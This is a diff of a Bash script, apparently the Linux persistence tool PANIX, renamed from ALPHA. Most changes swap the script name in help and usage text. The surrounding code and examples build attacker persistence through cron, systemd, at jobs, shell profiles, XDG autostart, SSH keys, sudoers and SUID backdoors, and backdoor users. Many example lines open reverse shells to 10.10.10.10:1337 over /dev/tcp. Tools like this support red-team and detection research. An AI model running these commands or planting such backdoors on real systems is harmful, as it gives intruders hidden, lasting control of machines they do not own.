@@ -4,10 +4,11 @@ NC='\033[0m'
 
 print_banner() {
 	echo ""
-	echo "           __            "
-	echo " /\  |    |__) |__|  /\  "
-	echo "/~~\ |___ |    |  | /~~\ "
+	echo " __                      "
+	echo "|__)  /\  |\\ | | \\_/   "
+	echo "|    /~~\\ | \\| | / \\  "
 	echo "                         "
+	echo "@RFGroenewoud"
 	echo ""
 }
 
@@ -34,11 +35,12 @@ usage_user() {
 	echo "  --ssh-key             SSH key persistence"
 	echo "  --systemd             Systemd service persistence"
 	echo "  --xdg                 XDG autostart persistence"
-	echo "  --revert              Revert most changes made by ALPHA's default options"
+	echo "  --revert              Revert most changes made by PANIX' default options"
 	echo "  --quiet (-q)          Quiet mode (no banner)"
 }
 
 usage_root() {
+	echo ""
 	echo "Root User Options:"
 	echo ""
 	echo "  --at                  At job persistence"
@@ -66,7 +68,7 @@ usage_root() {
 	echo "  --systemd             Systemd service persistence"
 	echo "  --udev                Udev (driver) persistence"
 	echo "  --xdg                 XDG autostart persistence"
-	echo "  --revert              Revert most changes made by ALPHA's default options"
+	echo "  --revert              Revert most changes made by PANIX' default options"
 	echo "  --quiet (-q)          Quiet mode (no banner)"
 	echo ""
 }
@@ -82,7 +84,7 @@ setup_systemd() {
 	local port=""
 
 	usage_systemd() {
-		echo "Usage: ./alpha.sh --systemd [OPTIONS]"
+		echo "Usage: ./panix.sh --systemd [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default systemd settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -127,10 +129,10 @@ setup_systemd() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --systemd --default --ip 10.10.10.10 --port 1337"
+				echo "./panix.sh --systemd --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/evil.service\" --timer"
+				echo "sudo ./panix.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/evil.service\" --timer"
 				exit 0
 				;;
 			--help|-h)
@@ -139,7 +141,7 @@ setup_systemd() {
 				;;
 			* )
 				echo "Invalid option for --systemd: $1"
-				echo "Try './alpha.sh --systemd --help' for more information."
+				echo "Try './panix.sh --systemd --help' for more information."
 				exit 1
 		esac
 		shift
@@ -147,12 +149,12 @@ setup_systemd() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --systemd --help' for more information."
+		echo "Try './panix.sh --systemd --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --systemd --help' for more information."
+			echo "Try './panix.sh --systemd --help' for more information."
 			exit 1
 		fi
 
@@ -238,7 +240,7 @@ setup_systemd() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $service_path || -z $command ]]; then
 			echo "Error: --path and --command must be specified when using --custom."
-			echo "Try './alpha.sh --systemd --help' for more information."
+			echo "Try './panix.sh --systemd --help' for more information."
 			exit 1
 		fi
 
@@ -307,7 +309,7 @@ setup_systemd() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --systemd."
-		echo "Try './alpha.sh --systemd --help' for more information."
+		echo "Try './panix.sh --systemd --help' for more information."
 		exit 1
 	fi
 
@@ -324,7 +326,7 @@ setup_generator_persistence() {
 	fi
 
 	usage_generator() {
-		echo "Usage: ./alpha.sh --generator [OPTIONS]"
+		echo "Usage: ./panix.sh --generator [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
@@ -342,7 +344,7 @@ setup_generator_persistence() {
 				;;
 			--examples )
 				echo "Examples:"
-				echo "./alpha.sh --generator --ip 10.10.10.10 --port 1337"
+				echo "./panix.sh --generator --ip 10.10.10.10 --port 1337"
 				exit 0
 				;;
 			--help|-h)
@@ -351,7 +353,7 @@ setup_generator_persistence() {
 				;;
 			* )
 				echo "Invalid option for --generator: $1"
-				echo "Try './alpha.sh --generator --help' for more information."
+				echo "Try './panix.sh --generator --help' for more information."
 				exit 1
 		esac
 		shift
@@ -359,7 +361,7 @@ setup_generator_persistence() {
 
 	if [[ -z $ip || -z $port ]]; then
 		echo "Error: --ip and --port must be specified."
-		echo "Try './alpha.sh --generator --help' for more information."
+		echo "Try './panix.sh --generator --help' for more information."
 		exit 1
 	fi
 
@@ -421,7 +423,7 @@ setup_cron() {
 
 	usage_cron() {
 		if check_root; then
-			echo "Usage: ./alpha.sh --cron [OPTIONS]"
+			echo "Usage: ./panix.sh --cron [OPTIONS]"
 			echo "Root User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default cron settings"
@@ -437,7 +439,7 @@ setup_cron() {
 			echo "   --monthly                    Persist in cron.monthly directory"
 			echo "   --weekly                     Persist in cron.weekly directory"
 		else
-			echo "Usage: ./alpha.sh --cron [OPTIONS]"
+			echo "Usage: ./panix.sh --cron [OPTIONS]"
 			echo "Low Privileged User Options:"
 			echo "--examples                   Display Cron persistence examples"
 			echo "--default                    Use default systemd settings"
@@ -506,17 +508,17 @@ setup_cron() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --cron --default --ip 10.10.10.10 --port 1337"
+				echo "./panix.sh --cron --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
 				echo "--daily|--hourly|--monthly|--weekly:"
-				echo "sudo ./alpha.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
+				echo "sudo ./panix.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
 				echo ""
 				echo "--crond:"
-				echo "sudo ./alpha.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
+				echo "sudo ./panix.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
 				echo ""
 				echo "--crontab:"
-				echo "sudo ./alpha.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
+				echo "sudo ./panix.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
 				exit 0
 				;;
 			--help|-h)
@@ -525,7 +527,7 @@ setup_cron() {
 				;;
 			* )
 				echo "Invalid option: $1"
-				echo "Try './alpha.sh --cron --help' for more information."
+				echo "Try './panix.sh --cron --help' for more information."
 				exit 1
 		esac
 		shift
@@ -534,7 +536,7 @@ setup_cron() {
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --default requires --ip and --port."
-			echo "Try './alpha.sh --cron --help' for more information."
+			echo "Try './panix.sh --cron --help' for more information."
 			exit 1
 		fi
 		if check_root; then
@@ -549,13 +551,13 @@ setup_cron() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command ]]; then
 			echo "Error: --custom requires --command."
-			echo "Try './alpha.sh --cron --help' for more information."
+			echo "Try './panix.sh --cron --help' for more information."
 			exit 1
 		fi
 		if [[ $option == "--daily" || $option == "--hourly" || $option == "--monthly" || $option == "--weekly" ]]; then
 			if [[ -z $name ]]; then
 				echo "Error: --custom with --daily|--hourly|--monthly|--weekly requires --name."
-				echo "Try './alpha.sh --cron --help' for more information."
+				echo "Try './panix.sh --cron --help' for more information."
 				exit 1
 			fi
 			echo -e "#!/bin/bash\n$command" > "$cron_path/$name"
@@ -563,7 +565,7 @@ setup_cron() {
 		elif [[ $option == "--crond" ]]; then
 			if [[ -z $name ]]; then
 				echo "Error: --custom with --crond requires --name."
-				echo "Try './alpha.sh --cron --help' for more information."
+				echo "Try './panix.sh --cron --help' for more information."
 				exit 1
 			fi
 			echo "$command" > "$cron_path/$name"
@@ -572,7 +574,7 @@ setup_cron() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --cron."
-		echo "Try './alpha.sh --cron --help' for more information."
+		echo "Try './panix.sh --cron --help' for more information."
 		exit 1
 	fi
 
@@ -588,7 +590,7 @@ setup_at() {
 	local time=""
 
 	usage_at() {
-		echo "Usage: ./alpha.sh --at [OPTIONS]"
+		echo "Usage: ./panix.sh --at [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default at settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -626,10 +628,10 @@ setup_at() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
+				echo "./panix.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
+				echo "sudo ./panix.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
 				exit 0
 				;;
 			--help|-h)
@@ -638,7 +640,7 @@ setup_at() {
 				;;
 			* )
 				echo "Invalid option for --at: $1"
-				echo "Try './alpha.sh --at --help' for more information."
+				echo "Try './panix.sh --at --help' for more information."
 				exit 1
 		esac
 		shift
@@ -651,25 +653,25 @@ setup_at() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --at --help' for more information."
+		echo "Try './panix.sh --at --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port || -z $time ]]; then
 			echo "Error: --ip, --port, and --time must be specified when using --default."
-			echo "Try './alpha.sh --at --help' for more information."
+			echo "Try './panix.sh --at --help' for more information."
 			exit 1
 		fi
 		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $time ]]; then
 			echo "Error: --command and --time must be specified when using --custom."
-			echo "Try './alpha.sh --at --help' for more information."
+			echo "Try './panix.sh --at --help' for more information."
 			exit 1
 		fi
 		echo "$command" | at $time
 	else
 		echo "Error: Either --default or --custom must be specified for --at."
-		echo "Try './alpha.sh --at --help' for more information."
+		echo "Try './panix.sh --at --help' for more information."
 		exit 1
 	fi
 
@@ -685,7 +687,7 @@ setup_shell_profile() {
 	local port=""
 
 	usage_shell_profile() {
-		echo "Usage: ./alpha.sh --shell-profile [OPTIONS]"
+		echo "Usage: ./panix.sh --shell-profile [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default shell profile settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -722,10 +724,10 @@ setup_shell_profile() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
+				echo "./panix.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
+				echo "sudo ./panix.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
 				exit 0
 				;;
 			--help|-h)
@@ -734,7 +736,7 @@ setup_shell_profile() {
 				;;
 			* )
 				echo "Invalid option for --shell-profile: $1"
-				echo "Try './alpha.sh --shell-profile --help' for more information."
+				echo "Try './panix.sh --shell-profile --help' for more information."
 				exit 1
 		esac
 		shift
@@ -742,12 +744,12 @@ setup_shell_profile() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --shell-profile --help' for more information."
+		echo "Try './panix.sh --shell-profile --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --shell-profile --help' for more information."
+			echo "Try './panix.sh --shell-profile --help' for more information."
 			exit 1
 		fi
 
@@ -762,14 +764,14 @@ setup_shell_profile() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $profile_path || -z $command ]]; then
 			echo "Error: --path and --command must be specified when using --custom."
-			echo "Try './alpha.sh --shell-profile --help' for more information."
+			echo "Try './panix.sh --shell-profile --help' for more information."
 			exit 1
 		fi
 
 		echo "$command" >> $profile_path
 	else
 		echo "Error: Either --default or --custom must be specified for --profile."
-		echo "Try './alpha.sh --shell-profile --help' for more information."
+		echo "Try './panix.sh --shell-profile --help' for more information."
 		exit 1
 	fi
 
@@ -782,7 +784,7 @@ setup_xdg() {
 	fi
 
 	usage_xdg() {
-		echo "Usage: ./alpha.sh --xdg [OPTIONS]"
+		echo "Usage: ./panix.sh --xdg [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default xdg settings"
 		echo "  --ip <ip>                  Specify IP address"
@@ -826,10 +828,10 @@ setup_xdg() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --xdg --default --ip 10.10.10.10 --port 1337"
+				echo "./panix.sh --xdg --default --ip 10.10.10.10 --port 1337"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/evilxdg.desktop\""
+				echo "sudo ./panix.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/evilxdg.desktop\""
 				exit 0
 				;;
 			--help|-h)
@@ -838,7 +840,7 @@ setup_xdg() {
 				;;
 			* )
 				echo "Invalid option for --xdg: $1"
-				echo "Try './alpha.sh --xdg --help' for more information."
+				echo "Try './panix.sh --xdg --help' for more information."
 				exit 1
 		esac
 		shift
@@ -846,12 +848,12 @@ setup_xdg() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --xdg --help' for more information."
+		echo "Try './panix.sh --xdg --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
-			echo "Try './alpha.sh --xdg --help' for more information."
+			echo "Try './panix.sh --xdg --help' for more information."
 			exit 1
 		fi
 
@@ -875,7 +877,7 @@ setup_xdg() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $profile_path || -z $command ]]; then
 			echo "Error: --file and --command must be specified when using --custom."
-			echo "Try './alpha.sh --xdg --help' for more information."
+			echo "Try './panix.sh --xdg --help' for more information."
 			exit 1
 		fi
 
@@ -895,7 +897,7 @@ setup_xdg() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --xdg."
-		echo "Try './alpha.sh --xdg --help' for more information."
+		echo "Try './panix.sh --xdg --help' for more information."
 		exit 1
 	fi
 
@@ -911,14 +913,14 @@ setup_ssh_key() {
 
 	usage_ssh_key() {
 		if check_root; then
-			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
+			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
 			echo "Root User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default SSH key settings"
 			echo "--custom                     Use custom SSH key settings"
 			echo "  --user <user>               Specify user for custom SSH key"
 		else
-			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
+			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
 			echo "Low Privileged User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default SSH key settings"
@@ -940,10 +942,10 @@ setup_ssh_key() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --ssh-key --default"
+				echo "./panix.sh --ssh-key --default"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --ssh-key --custom --user victim"
+				echo "sudo ./panix.sh --ssh-key --custom --user victim"
 				exit 0
 				;;
 			--help|-h)
@@ -952,7 +954,7 @@ setup_ssh_key() {
 				;;
 			* )
 				echo "Invalid option for --ssh-key: $1"
-				echo "Try './alpha.sh --ssh-key --help' for more information."
+				echo "Try './panix.sh --ssh-key --help' for more information."
 				exit 1
 		esac
 		shift
@@ -965,7 +967,7 @@ setup_ssh_key() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --ssh-key --help' for more information."
+		echo "Try './panix.sh --ssh-key --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if check_root; then
@@ -987,7 +989,7 @@ setup_ssh_key() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $target_user ]]; then
 			echo "Error: --user must be specified when using --custom."
-			echo "Try './alpha.sh --ssh-key --help' for more information."
+			echo "Try './panix.sh --ssh-key --help' for more information."
 			exit 1
 		fi
 
@@ -1010,7 +1012,7 @@ setup_ssh_key() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --ssh-key."
-		echo "Try './alpha.sh --ssh-key --help' for more information."
+		echo "Try './panix.sh --ssh-key --help' for more information."
 		exit 1
 	fi
 
@@ -1025,7 +1027,7 @@ setup_authorized_keys() {
 
 	usage_authorized_keys() {
 		if check_root; then
-			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
+			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
 			echo "Root User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default authorized keys settings"
@@ -1034,7 +1036,7 @@ setup_authorized_keys() {
 			echo "  --key <key>                  Specify the public key"
 			echo "  --path <path>                Specify custom authorized keys file path"
 		else
-			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
+			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
 			echo "Low Privileged User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default authorized keys settings"
@@ -1061,10 +1063,10 @@ setup_authorized_keys() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "./alpha.sh --authorized-keys --default --key <public_key>"
+				echo "./panix.sh --authorized-keys --default --key <public_key>"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
+				echo "sudo ./panix.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
 				exit 0
 				;;
 			--help|-h)
@@ -1073,7 +1075,7 @@ setup_authorized_keys() {
 				;;
 			* )
 				echo "Invalid option for --authorized-keys: $1"
-				echo "Try './alpha.sh --authorized-keys --help' for more information."
+				echo "Try './panix.sh --authorized-keys --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1081,11 +1083,11 @@ setup_authorized_keys() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --authorized-keys --help' for more information."
+		echo "Try './panix.sh --authorized-keys --help' for more information."
 		exit 1
 	elif [[ -z $key ]]; then
 		echo "Error: --key must be specified."
-		echo "Try './alpha.sh --authorized-keys --help' for more information."
+		echo "Try './panix.sh --authorized-keys --help' for more information."
 		exit 1
 	fi
 
@@ -1096,7 +1098,7 @@ setup_authorized_keys() {
 			mkdir -p $(dirname $path)
 		else
 			echo "Error: --path must be specified with --custom for root."
-			echo "Try './alpha.sh --authorized-keys --help' for more information."
+			echo "Try './panix.sh --authorized-keys --help' for more information."
 			exit 1
 		fi
 	else
@@ -1105,7 +1107,7 @@ setup_authorized_keys() {
 			path="/home/$current_user/.ssh/authorized_keys"
 		else
 			echo "Error: Only root can use --custom for --authorized-keys."
-			echo "Try './alpha.sh --authorized-keys --help' for more information."
+			echo "Try './panix.sh --authorized-keys --help' for more information."
 			exit 1
 		fi
 	fi
@@ -1127,7 +1129,7 @@ setup_new_user() {
 	fi
 
 	usage_create_user() {
-		echo "Usage: ./alpha.sh --create-user [OPTIONS]"
+		echo "Usage: ./panix.sh --create-user [OPTIONS]"
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 		echo "--password <password>      Specify the password"
@@ -1145,7 +1147,7 @@ setup_new_user() {
 				;;
 			--examples )
 				echo "Examples:"
-				echo "sudo ./alpha.sh --create-user --username <username> --password <password>"
+				echo "sudo ./panix.sh --create-user --username <username> --password <password>"
 				exit 0
 				;;
 			--help|-h)
@@ -1154,7 +1156,7 @@ setup_new_user() {
 				;;
 			* )
 				echo "Invalid option for --create-user: $1"
-				echo "Try './alpha.sh --create-user --help' for more information."
+				echo "Try './panix.sh --create-user --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1162,7 +1164,7 @@ setup_new_user() {
 
 	if [[ -z $username || -z $password ]]; then
 		echo "Error: --username and --password must be specified."
-		echo "Try './alpha.sh --create-user --help' for more information."
+		echo "Try './panix.sh --create-user --help' for more information."
 		exit 1
 	fi
 
@@ -1176,7 +1178,7 @@ setup_backdoor_user() {
 	local username=""
 
 	usage_backdoor_user() {
-		echo "Usage: ./alpha.sh --backdoor-user [OPTIONS]"
+		echo "Usage: ./panix.sh --backdoor-user [OPTIONS]"
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 	}
@@ -1194,7 +1196,7 @@ setup_backdoor_user() {
 				;;
 			--examples )
 				echo "Examples:"
-				echo "sudo ./alpha.sh --backdoor-user --username <username>"
+				echo "sudo ./panix.sh --backdoor-user --username <username>"
 				exit 0
 				;;
 			--help|-h)
@@ -1203,7 +1205,7 @@ setup_backdoor_user() {
 				;;
 			* )
 				echo "Invalid option for --backdoor-user: $1"
-				echo "Try './alpha.sh --backdoor-user --help' for more information."
+				echo "Try './panix.sh --backdoor-user --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1211,7 +1213,7 @@ setup_backdoor_user() {
 
 	if [[ -z $username ]]; then
 		echo "Error: --username must be specified."
-		echo "Try './alpha.sh --backdoor-user --help' for more information."
+		echo "Try './panix.sh --backdoor-user --help' for more information."
 		exit 1
 	fi
 
@@ -1236,7 +1238,7 @@ setup_password_change() {
 	fi
 
 	usage_password_change() {
-		echo "Usage: ./alpha.sh --password-change [OPTIONS]"
+		echo "Usage: ./panix.sh --password-change [OPTIONS]"
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 		echo "--password <password>      Specify the new password"
@@ -1254,7 +1256,7 @@ setup_password_change() {
 				;;
 			--examples )
 				echo "Examples:"
-				echo "sudo ./alpha.sh --password-change --username <username> --password <password>"
+				echo "sudo ./panix.sh --password-change --username <username> --password <password>"
 				exit 0
 				;;
 			--help|-h)
@@ -1263,7 +1265,7 @@ setup_password_change() {
 				;;
 			* )
 				echo "Invalid option for --password-change: $1"
-				echo "Try './alpha.sh --password-change --help' for more information."
+				echo "Try './panix.sh --password-change --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1271,7 +1273,7 @@ setup_password_change() {
 
 	if [[ -z $username || -z $password ]]; then
 		echo "Error: --username and --password must be specified."
-		echo "Try './alpha.sh --password-change --help' for more information."
+		echo "Try './panix.sh --password-change --help' for more information."
 		exit 1
 	fi
 
@@ -1298,7 +1300,7 @@ setup_passwd_user() {
 	fi
 
 	usage_passwd_user() {
-		echo "Usage: ./alpha.sh --passwd-user [OPTIONS]"
+		echo "Usage: ./panix.sh --passwd-user [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default settings"
 		echo "  --username <username>        Specify the username"
@@ -1330,10 +1332,10 @@ setup_passwd_user() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --passwd-user --default --username <username> --password <password>"
+				echo "sudo ./panix.sh --passwd-user --default --username <username> --password <password>"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
+				echo "sudo ./panix.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
 				exit 0
 				;;
 			--help|-h)
@@ -1343,7 +1345,7 @@ setup_passwd_user() {
 		
 			* )
 				echo "Invalid option for --passwd-user: $1"
-				echo "Try './alpha.sh --passwd-user --help' for more information."
+				echo "Try './panix.sh --passwd-user --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1351,14 +1353,14 @@ setup_passwd_user() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --passwd-user --help' for more information."
+		echo "Try './panix.sh --passwd-user --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $username || -z $password ]]; then
 			echo "Error: --username and --password must be specified with --default."
-			echo "Try './alpha.sh --passwd-user --help' for more information."
+			echo "Try './panix.sh --passwd-user --help' for more information."
 			exit 1
 		fi
 
@@ -1379,7 +1381,7 @@ setup_passwd_user() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $passwd_string ]]; then
 			echo "Error: --passwd-string must be specified with --custom."
-			echo "Try './alpha.sh --passwd-user --help' for more information."
+			echo "Try './panix.sh --passwd-user --help' for more information."
 			exit 1
 		fi
 
@@ -1387,7 +1389,7 @@ setup_passwd_user() {
 		echo "[+] Custom passwd string added to /etc/passwd."
 	else
 		echo "Error: Either --default or --custom must be specified for --passwd-user."
-		echo "Try './alpha.sh --passwd-user --help' for more information."
+		echo "Try './panix.sh --passwd-user --help' for more information."
 		exit 1
 	fi
 	echo "[+] /etc/passwd persistence established!"
@@ -1402,7 +1404,7 @@ setup_sudoers_backdoor() {
 	fi
 
 	usage_sudoers_backdoor() {
-		echo "Usage: ./alpha.sh --sudoers-backdoor [OPTIONS]"
+		echo "Usage: ./panix.sh --sudoers-backdoor [OPTIONS]"
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 	}
@@ -1415,7 +1417,7 @@ setup_sudoers_backdoor() {
 				;;
 			--examples )
 				echo "Examples:"
-				echo "sudo ./alpha.sh --sudoers --username <username>"
+				echo "sudo ./panix.sh --sudoers --username <username>"
 				exit 0
 				;;
 			--help|-h)
@@ -1424,7 +1426,7 @@ setup_sudoers_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --sudoers-backdoor: $1"
-				echo "Try './alpha.sh --sudoers-backdoor --help' for more information."
+				echo "Try './panix.sh --sudoers-backdoor --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1432,7 +1434,7 @@ setup_sudoers_backdoor() {
 
 	if [[ -z $username ]]; then
 		echo "Error: --username must be specified."
-		echo "Try './alpha.sh --sudoers-backdoor --help' for more information."
+		echo "Try './panix.sh --sudoers-backdoor --help' for more information."
 		exit 1
 	fi
 
@@ -1458,7 +1460,7 @@ setup_suid_backdoor() {
 	fi
 
 	usage_suid_backdoor() {
-		echo "Usage: ./alpha.sh --suid [OPTIONS]"
+		echo "Usage: ./panix.sh --suid [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default SUID settings"
 		echo "--custom                     Use custom SUID settings"
@@ -1480,10 +1482,10 @@ setup_suid_backdoor() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./alpha.sh --suid --default"
+				echo "sudo ./panix.sh --suid --default"
 				echo ""
 				echo "--custom:"
-				echo "sudo ./alpha.sh --suid --custom --binary \"/bin/find\""
+				echo "sudo ./panix.sh --suid --custom --binary \"/bin/find\""
 				exit 0
 				;;
 			--help|-h)
@@ -1492,7 +1494,7 @@ setup_suid_backdoor() {
 				;;
 			* )
 				echo "Invalid option for --suid: $1"
-				echo "Try './alpha.sh --suid --help' for more information."
+				echo "Try './panix.sh --suid --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1500,13 +1502,13 @@ setup_suid_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
-		echo "Try './alpha.sh --suid --help' for more information."
+		echo "Try './panix.sh --suid --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		echo "Try './alpha.sh --suid --help' for more information."
+		echo "Try './panix.sh --suid --help' for more information."
 		exit 1
 	fi
 
@@ -1531,7 +1533,7 @@ setup_suid_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary ]]; then
 			echo "Error: --binary must be specified with --custom."
-			echo "Try './alpha.sh --suid --help' for more information."
+			echo "Try './panix.sh --suid --help' for more information."
 			exit 1
 		fi
 
@@ -1566,7 +1568,7 @@ setup_motd_backdoor() {
 	fi
 
 	usage_motd_backdoor() {
-		echo "Usage: ./alpha.sh --motd [OPTIONS]"
+		echo "Usage: ./panix.sh --motd [OPTIONS]"
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default MOTD settings"
 		echo "  --ip <ip>                    Specify IP address"
@@ -1603,10 +1605,10 @@ setup_motd_backdoor() {
 			--examples )
 				echo "Examples:"
 				echo "--default:"
